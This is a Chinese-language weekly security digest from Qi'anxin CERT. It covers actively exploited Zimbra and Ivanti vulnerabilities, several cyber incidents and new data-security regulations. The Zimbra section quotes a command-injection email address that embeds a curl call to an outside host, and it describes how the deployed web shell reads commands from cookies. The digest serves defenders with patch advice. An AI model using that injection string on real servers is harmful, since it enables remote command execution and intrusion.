---
title: 安全热点周报：研究人员警告称，利用 Zimbra Collaboration 关键漏洞发起的攻击正在持续发生
url: https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247502231&idx=1&sn=064d60427f108f8f909c083eeb668d62&chksm=fe79ed0fc90e6419d5697cfa860a5d6ecbd8b7329cbbd76b01abc16f26cc66321db05e1e2547&scene=58&subscene=0#rd
source: 奇安信 CERT
date: 2024-10-09
fetch_date: 2025-10-06T18:54:03.309878
---

# 安全热点周报：研究人员警告称，利用 Zimbra Collaboration 关键漏洞发起的攻击正在持续发生

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/EkibxOB3fs4icAP3s7pxZVo34BjkaEBPhoicQQRecSwbJUNPPNh9e8kW3jcB2K7iaSYJmtjicsYPib5ou53bsptdA5Nw/0?wx_fmt=jpeg)

# 安全热点周报：研究人员警告称，利用 Zimbra Collaboration 关键漏洞发起的攻击正在持续发生

奇安信 CERT

| **安全资讯导视** |
| --- |
| • 《网络数据安全管理条例》公布 |
| • 南昌市某企业IP疑被黑客远控并滥用，当地网信办罚款5万元 |
| • 以色列黑入贝鲁特机场塔台，阻止伊朗飞机降落 |

**PART****0****1**

**新增在野利用**

**1.****Zimbra Collaboration Joule 命令执行漏洞(CVE-2024-45519)**

10月3日，网络安全研究人员警告称，有人试图针对 Synacor 的 Zimbra Collaboration 中新披露的安全漏洞进行主动攻击。

企业安全公司 Proofpoint 表示，它从 2024 年 9 月 28 日开始观察该活动。此次攻击试图利用CVE-2024-45519，这是 Zimbra 后日志服务中的一个严重安全漏洞，可能使未经身份验证的攻击者能够在受影响的安装上执行任意命令。

Proofpoint在 X 的一系列帖子中表示：“这些伪造 Gmail 的电子邮件被发送到抄送字段中的虚假地址，试图让 Zimbra 服务器解析并执行这些命令。这些地址包含使用 sh 实用程序执行的 Base64 字符串。”

Zimbra在 2024 年 9 月 4 日发布的8.8.15 Patch 46、9.0.0 Patch 41、10.0.9 和 10.1.1 版本中解决了这一严重问题。一位名为 lebr0nli（Alan Li）的安全研究员因发现并报告这一漏洞而受到赞誉。

Synacor 安全架构师工程师 Ashish Kataria在 2024 年 9 月 19 日的评论中指出：“虽然在大多数系统上，postjournal 功能可能是可选的或未启用的，但仍然有必要应用提供的补丁来防止潜在的攻击。”对于未启用 postjournal 功能且无法立即应用补丁的 Zimbra 系统，可以考虑删除 postjournal 二进制文件作为一种临时措施，直到可以应用补丁为止。

Proofpoint 表示，它确定了一系列 CC 地址，这些地址在解码后会尝试在位于“/jetty/webapps/zimbraAdmin/public/jsp/zimbraConfig.jsp”的易受攻击的 Zimbra 服务器上写入 Web shell。随后，已安装的 Web Shell 将使用预定的 JSESSIONID Cookie 字段来监听入站连接，如果存在，则继续解析 JACTION cookie 以获取 Base64 命令。Web Shell 配备了通过 exec 执行命令的支持。

尽管如此，攻击活动似乎是在 Project Discovery 发布该漏洞的技术细节后的第二天开始的，该细节称“该漏洞源于未修补版本中未经清理的用户输入被传递给popen，从而使攻击者能够注入任意命令”。

该网络安全公司表示，问题根源在于基于 C 的 postjournal 二进制文件在名为“msg\_handler()”的函数中处理和解析收件人电子邮件地址的方式，从而允许在传递带有虚假地址的特制 SMTP 消息（例如“aabbb$(curl${IFS}oast.me)”@mail.domain.com）时对运行在端口 10027 上的服务进行命令注入。

鉴于积极的攻击尝试，强烈建议用户应用最新补丁，以获得最佳的防护以抵御潜在威胁。

参考链接：

https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html

**2.****Ivanti Endpoint Manager SQL注入漏洞(CVE-2024-29824)**

10月2日，美国网络安全和基础设施安全局 (CISA) 根据主动利用的证据，添加了一个影响 Ivanti 端点管理器 (EPM) 的安全漏洞，该公司于 5 月份将该漏洞添加到其已知被利用漏洞 ( KEV ) 目录中。该漏洞的编号为 CVE-2024-29824，CVSS 评分为 9.6，严重程度极高。

该软件服务提供商在 2024 年 5 月 21 日发布的公告中表示：“Ivanti EPM 2022 SU5 及之前版本的核心服务器中存在一个未指定的 SQL 注入漏洞，允许同一网络内的未经身份验证的攻击者执行任意代码。”

Horizon3.ai于 6 月份发布了针对该漏洞的概念验证 (PoC) 漏洞，并表示该问题根源在于名为 PatchBiz.dll 的 DLL 中的 RecordGoodApp() 函数。具体来说，它涉及该函数如何处理 SQL 查询语句，从而允许攻击者通过 xp\_cmdshell 获得远程代码执行。

目前该漏洞具体如何被利用暂未公开，但 Ivanti 已更新公告，称其已“确认 CVE-2024-29824 遭利用”，且“有限数量的客户”已成为攻击目标。

建议使用受影响版本的客户对其 Ivanti 端点解决方案应用修复程序，如果无法修复，建议立即停止使用。

参考链接：

https://thehackernews.com/2024/10/ivanti-endpoint-manager-flaw-actively.html

**PART****0****2**

**安全事件**

**1.南昌市某企业IP疑被黑客远控并滥用，当地网信办罚款5万元**

9月30日网信南昌公众号消息，南昌市网信办在日常的网络安全监测中发现，属地企业所属IP疑似被黑客远控，频繁对外发起网络爆破攻击。经过立案调查、现场勘验、远程勘验（采样技术分析）、笔录问询等工作，查明：1.该企业未履行网络安全保护义务，未对运营的网络及信息系统开展网络安全等级保护测评等相关工作，并采取防范计算机病毒和网络攻击等危害网络安全行为的技术措施；2.该企业未及时处置计算机病毒、网络攻击等安全风险，所属终端感染木马病毒，持续对外发起网络攻击，导致产生危害网络安全的后果。相关行为违反了《中华人民共和国网络安全法》第二十一条、第二十五条的规定。9月29日，南昌市网信办依据《中华人民共和国网络安全法》第五十九条的规定，对该企业作出罚款5万元、对直接负责的主管人员作出罚款1万元的行政处罚。

原文链接：

https://mp.weixin.qq.com/s/ZjVIDs\_InjgXMa5q7cuS3w

**2.科威特卫生部被黑，致使国内多个医疗服务中断**

9月27日The Record消息，中东国家科威特的卫生部日前遭遇网络攻击，导致该国多家医院的系统瘫痪，国家医疗应用Sahel也因此下线。截至9月26日下午，卫生部官网仍处于瘫痪状态。该部门通过科威特通讯社发布声明称，政府通过备份数据，已经成功恢复了科威特癌症控制中心的系统，以及国家健康保险和外籍人员体检管理办公室的相关系统。声明还称，黑客未能攻入“核心数据库”，但为进行必要的安全更新，卫生部不得不暂时关闭部分系统。卫生部没有提供系统全面恢复的确切时间表，仅表示恢复工作将很快完成。目前尚无任何勒索软件组织对这次攻击事件宣称负责。

原文链接：

https://therecord.media/kuwait-ministry-restoring-systems-cyberattack

**3.以色列黑入贝鲁特机场塔台，阻止伊朗飞机降落**

9月28日Middle East Monitor消息，黎巴嫩贝鲁特国际机场的控制塔台疑似遭以色列网络攻击，导致一架伊朗民航班机未能降落，被迫返回德黑兰。黎巴嫩交通部长阿里·哈米向黎巴嫩媒体《An-Nahar》透露，以色列国防军拦截了贝鲁特机场控制塔的无线电通信，并威胁称，如果这架伊朗飞机降落，将攻击机场基础设施。以色列媒体《耶路撒冷邮报》也报道称，以色列军方入侵了贝鲁特控制塔的通信系统，警告一架来自“卡西姆航空”的货运飞机，航班号为QFZ9964，在其准备降落时发出警告。以色列军方声称，贝鲁特国际机场被用作向真主党输送武器的入口，但黎巴嫩当局对此予以否认，强调机场是完全用于民用的基础设施。

原文链接：

https://www.middleeastmonitor.com/20240928-israeli-army-hacks-into-beirut-airport-control-tower-threatens-iranian-civilian-plane/

**PART****0****3**

**政策法规**

**1.9国14家网络安全机构联合发布《运营技术网络安全原则》**

10月2日，澳大利亚信号局网络安全中心与五眼联盟、德国、荷兰、日本、韩国的网络安全机构联合发布《运营技术（OT）网络安全原则》，阐述了指导创建和维护安全、可靠的关键基础设施OT环境的六项原则，包括安全至上（确保系统安全）；了解业务至关重要（了解并保护关键系统）；OT数据极其宝贵且需要保护（保护OT数据）；将OT与其他所有网络进行隔离和分段（守好边界关紧后门）；供应链必须安全（确保网络安全供应链）；人员在OT网络安全中至关重要（人员是第一道防线）。

原文链接：

https://www.cyber.gov.au/about-us/view-all-content/publications/principles-operational-technology-cyber-security

**2.《网络数据安全管理条例》公布**

9月30日，国务院总理李强签署国务院令，公布《网络数据安全管理条例》，自2025年1月1日起施行。该文件共9章64条，包括总则、一般规定、个人信息保护、重要数据安全、网络数据跨境安全管理、网络平台服务提供者义务、监督管理、法律责任、附则。该文件主要规定了五方面内容，一是提出网络数据安全管理总体要求和一般规定。二是细化个人信息保护规定。三是完善重要数据安全制度。四是优化网络数据跨境安全管理规定。五是明确网络平台服务提供者义务。

原文链接：

https://www.gov.cn/zhengce/content/202409/content\_6977766.htm

**3.《网络安全技术 统一威胁管理产品 (UTM) 技术规范》等15项国家标准公开征求意见**

9月30日，全国网络安全标准化技术委员会归口的15项国家标准已形成标准征求意见稿，现公开征求意见。这批标准包括《网络安全技术 公钥密码应用技术体系框架》和14项网安产品技术规范标准，分别为《网络安全技术 统一威胁管理产品（UTM）技术规范》《网络安全技术 身份鉴别产品技术规范》《网络安全技术 数据泄露防护产品技术规范》《网络安全技术 终端接入控制产品技术规范》《网络安全技术 负载均衡产品技术规范》《网络安全技术 网络型流量控制产品技术规范》《网络安全技术 USB移动存储介质管理系统技术规范》《网络安全技术 信息过滤产品技术规范》《网络安全技术 电子文档安全管理产品技术规范》《网络安全技术 终端安全监测产品技术规范》《网络安全技术 日志分析产品技术规范》《网络安全技术 安全配置检查产品技术规范》《网络安全技术 数据销毁软件产品技术规范》《网络安全技术 抗拒绝服务攻击产品技术规范》。

原文链接：

https://www.secrss.com/articles/70849

**4.《网络安全标准实践指南——学术科技服务平台数据安全要求》公开征求意见**

9月30日，全国网络安全标准化技术委员会秘书处组织编制了《网络安全标准实践指南——学术科技服务平台数据安全要求（征求意见稿）》，现公开征求意见。该文件规定了学术科技服务平台数据安全保护要求，提出了学术科技服务平台运营者应履行的安全责任和义务，适用于规范学术科技服务平台运营者数据处理活动，也可为有关主管监管部门组织开展相关检查评估提供参考。该文件不适用于涉及国家秘密的数据。

原文链接：

https://www.tc260.org.cn/upload/2024-09-30/1727691849701022711.pdf

**往期精彩推荐**

[安全热点周报：严重的 Ivanti vTM 身份认证绕过漏洞现已被攻击利用](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247502218&idx=1&sn=1911aaea26cf117a13c8db46af66a5ba&chksm=fe79ed12c90e6404076d806b29b138e8264d9b0a1360a43d0046a74692889ba53aa00906a2f8&token=1401714999&lang=zh_CN&scene=21#wechat_redirect)
[【已复现】cups-browsed 远程代码执行漏洞(CVE-2024-47176)安全风险通告第二次更新](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247502217&idx=1&sn=58b66c5fd01549ef7633e6a8ae104491&chksm=fe79ed11c90e64070b4bb5460a15a15b98547f02a41cfa58d6fda022edf4c224827d9e4ca2b2&token=1401714999&lang=zh_CN&scene=21#wechat_redirect)

[cups-browsed 远程代码执行漏洞(CVE-2024-47176)安全风险通告](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247502207&idx=1&sn=cfc9b1847e536079d77a15b62c233f71&chksm=fe79ede7c90e64f152e40ebd2eb9ea5c25f60156788a4a3ba17b585916170400fcc6cb8739d3&token=1401714999&lang=zh_CN&scene=21#wechat_redirect)

本期周报内容由安全内参&虎符智库&奇安信CERT联合出品！

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs4ic3Dr2nTQbrt9ZdsEIxjK36YibkxgDHpwdDIFJvShiaib2ia3lzIIVqEeDNDEib9WNuZ1IdcjgUWIWGWKw/0?wx_fmt=png)

奇安信 CERT

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs4ic3Dr2nTQbrt9ZdsEIxjK36YibkxgDHpwdDIFJvShiaib2ia3lzIIVqEeDNDEib9WNuZ1IdcjgUWIWGWKw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过